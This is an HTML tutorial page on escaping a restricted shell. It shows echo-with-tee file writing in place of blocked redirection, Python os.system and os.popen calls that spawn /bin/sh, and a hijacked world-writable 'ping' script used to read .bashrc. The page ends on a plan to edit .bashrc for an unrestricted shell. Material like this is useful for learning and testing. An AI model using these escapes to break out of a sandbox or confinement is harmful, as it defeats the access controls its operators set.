<title>Make Your Own Script</title>
</head><body>Tee Command<br/>
<br/>
If you do not have access to an editor, and would like to create a script, you can make use of the 'tee' command. Since you cannot make use of '&gt;' or '&gt;&gt;', the 'tee' command can help you direct your output when used in tandem with the 'echo' command. This is not a shell escape in of itself, but consider the following:<br/>
echo &quot;evil script code&quot; | tee script.sh<br/>
<br/>
You will be able to create a file called script.sh in your home directory and add your script code to the file. Once the file is created, use the 'tee -a' option for all subsequent commands as the '-a' allows you to append to the file rather than overwrite the file.<br/>
<br/>
python: <br/>
exit_code = os.system('/bin/sh') <br/>
output = os.popen('/bin/sh').read()<br/>
<br/>
$ cat /tmp/id.sh<br/>
#!/bin/sh<br/>
/usr/bin/id<br/>
<br/>
In this example, ping is a world writable executable located within the $PATH<br/>
When a terminal opens up, it reads .bashrc which tells it what behavior to default to. I used my ping script to cat my .bashrc<br/>
echo '#!/bin/bash' | tee '/home/confined1/bin/ping'<br/>
echo '/bin/cat /home/confined1/.bashrc' | tee -a '/home/confined1/bin/ping'<br/>
<br/>
confined1@someserver:~$ ping<br/>
PATH=/home/confined1/bin<br/>
export PATH<br/>
confined1@someserver:~$<br/>
<br/>
This is what I found. So if we change our .bashrc file so that instead of setting our PATH, it sets our SHELL then we should be free!<span style="font-size: 10pt"><br/>
